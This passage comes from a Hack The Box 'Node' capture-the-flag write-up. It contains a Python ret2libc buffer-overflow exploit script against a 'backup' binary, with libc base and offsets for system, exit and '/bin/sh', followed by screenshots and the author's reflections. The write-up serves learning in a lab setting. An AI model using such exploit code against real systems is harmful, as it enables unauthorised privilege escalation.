signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":

    offset = 512
    before_eip = b"A" * offset

    # which backup | xargs ldd
    # libc.so.6 => /lib32/libc.so.6 (0xf7585000)
    base_libc_address = 0xf7585000

    # readelf -s /lib32/libc.so.6 | grep -E " exit@| system@"
    # 141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
    # 1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
    # strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
    # 15900b /bin/sh
    system_offset = 0x0003a940
    exit_offset = 0x0002e7b0
    bin_sh_offset = 0x0015900b

    system_address = pack("<I", base_libc_address + system_offset)
    exit_address = pack("<I", base_libc_address + exit_offset)
    bin_sh_address = pack("<I", base_libc_address + bin_sh_offset)

    # ret2libc: EIP -> SYSTEM + EXIT + BIN_SH
    eip = system_address + exit_address + bin_sh_address

    payload = before_eip + eip

    sys.stdout.buffer.write(payload)
```

<br />
<img src="{{ site.img_path }}/node_writeup/Node_109.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_110.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_111.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_112.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_113.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/node_writeup/Node_114.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> I can't get enough of this vulnerability, it's one of my favorites. This box turned out to be a bit long because it is a bit more complex than the one I did before, but I am assimilating better the concepts related to **Buffer Overflow**, it is time to continue to the next challenge that **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** has in store for me. I kill the box from my dashboard and look for the new box.

<br /><br />
<img src="{{ site.img_path }}/node_writeup/Node_115.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
